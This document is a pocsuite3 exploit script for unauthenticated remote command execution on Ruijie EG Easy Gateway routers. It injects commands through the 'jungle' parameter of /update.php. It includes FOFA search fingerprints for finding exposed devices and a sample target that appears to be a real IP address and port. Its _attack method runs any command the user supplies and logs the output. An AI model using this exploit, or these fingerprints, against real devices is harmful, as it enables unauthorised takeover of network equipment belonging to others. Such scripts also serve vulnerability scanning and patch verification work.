from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY
from pocsuite3.api import OptString
from collections import OrderedDict
from collections import OrderedDict

class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    name = '锐捷_EG易网关_WEB管理系统_前台RCE'
    appName = '锐捷'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
        [FOFA指纹]
        title="锐捷网络 --NBR路由器--登录界面"
        body="请输入您的RG-EG易网关的用户名和密码"
        '''
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ['222.80.92.31:9999']

    def _verify(self):
        result = {}
        target = self.url + "/update.php?jungle=id"
        try:
            r1 = requests.get(target,allow_redirects=True,verify=False)
            if "uid" in r1.text and r1.status_code == 200: 
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            logger.error(e)
        return self.parse_output(result)

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString('', description='请输入需要执行的命令', require=True)
        return o

    def _attack(self):
        result = {}
        target = self.url + "/update.php?jungle=" + self.get_option("cmd")
        try:
            r1 = requests.get(target,allow_redirects=True,verify=False)
            if r1.status_code == 200: 
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                logger.info(r1.text)
        except Exception as e:
            logger.error(e)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(DemoPOC)